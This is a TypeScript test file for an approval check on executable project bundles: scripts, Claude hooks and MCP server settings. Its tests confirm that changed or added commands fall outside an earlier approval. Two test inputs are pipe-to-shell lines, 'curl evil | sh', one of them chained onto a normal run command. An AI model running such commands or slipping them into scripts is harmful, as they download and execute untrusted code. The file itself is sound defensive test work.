import { describe, expect, it } from 'vitest';
import { isBundleCoveredBy, type BundleContent } from './executable-bundle';

/**
 * An approval covers what was approved and anything that runs less of it:
 * the same commands, fewer scripts. Anything new or changed is not covered.
 */
const APPROVED: BundleContent = {
  chord: {
    setup: 'pnpm i',
    run: { web: 'pnpm web', api: 'pnpm api' },
    test: 'pnpm t',
    teardown: 'make down',
    shellSetup: 'source .envrc',
  },
  claude: { settings: { hooks: { Stop: [{ command: 'echo done' }] } }, mcpServers: { db: {} } },
};

function withChord(chord: BundleContent['chord']): BundleContent {
  return { chord, claude: APPROVED.claude };
}

describe('isBundleCoveredBy', () => {
  it('covers identical content', () => {
    expect(isBundleCoveredBy(APPROVED, structuredClone(APPROVED))).toBe(true);
  });

  it('covers content with fewer scripts', () => {
    const { test: _replacedByTheUser, ...rest } = APPROVED.chord;
    expect(isBundleCoveredBy(APPROVED, withChord(rest))).toBe(true);
    expect(isBundleCoveredBy(APPROVED, withChord({ teardown: 'make down' }))).toBe(true);
    expect(isBundleCoveredBy(APPROVED, withChord({}))).toBe(true);
  });

  it('covers content with a run script fewer', () => {
    expect(
      isBundleCoveredBy(APPROVED, withChord({ ...APPROVED.chord, run: { web: 'pnpm web' } }))
    ).toBe(true);
  });

  it('treats a string run as the run script with id default', () => {
    const asString = withChord({ run: 'pnpm dev' });
    const asMap = withChord({ run: { default: 'pnpm dev' } });
    expect(isBundleCoveredBy(asString, asMap)).toBe(true);
    expect(isBundleCoveredBy(asMap, asString)).toBe(true);
  });

  it('does not cover a changed command', () => {
    expect(
      isBundleCoveredBy(APPROVED, withChord({ ...APPROVED.chord, teardown: 'curl evil | sh' }))
    ).toBe(false);
    expect(
      isBundleCoveredBy(
        APPROVED,
        withChord({ ...APPROVED.chord, run: { web: 'pnpm web && curl evil | sh' } })
      )
    ).toBe(false);
    expect(
      isBundleCoveredBy(withChord({ run: 'pnpm dev' }), withChord({ run: { default: 'pnpm x' } }))
    ).toBe(false);
  });

  it('does not cover an added script', () => {
    const { test: _notApproved, ...approvedWithoutTest } = APPROVED.chord;
    expect(isBundleCoveredBy(withChord(approvedWithoutTest), APPROVED)).toBe(false);
    expect(
      isBundleCoveredBy(
        APPROVED,
        withChord({ ...APPROVED.chord, run: { ...(APPROVED.chord.run as object), db: 'pnpm db' } })
      )
    ).toBe(false);
  });

  it('does not cover a changed Claude config, a smaller one included', () => {
    expect(
      isBundleCoveredBy(APPROVED, {
        chord: APPROVED.chord,
        claude: { ...APPROVED.claude, mcpServers: { db: {}, other: { command: 'x' } } },
      })
    ).toBe(false);
    expect(
      isBundleCoveredBy(APPROVED, {
        chord: APPROVED.chord,
        claude: { settings: APPROVED.claude.settings },
      })
    ).toBe(false);
  });

  it('covers a Claude config written with its keys in another order', () => {
    expect(
      isBundleCoveredBy(APPROVED, {
        chord: APPROVED.chord,
        claude: {
          mcpServers: { db: {} },
          settings: { hooks: { Stop: [{ command: 'echo done' }] } },
        },
      })
    ).toBe(true);
  });
});
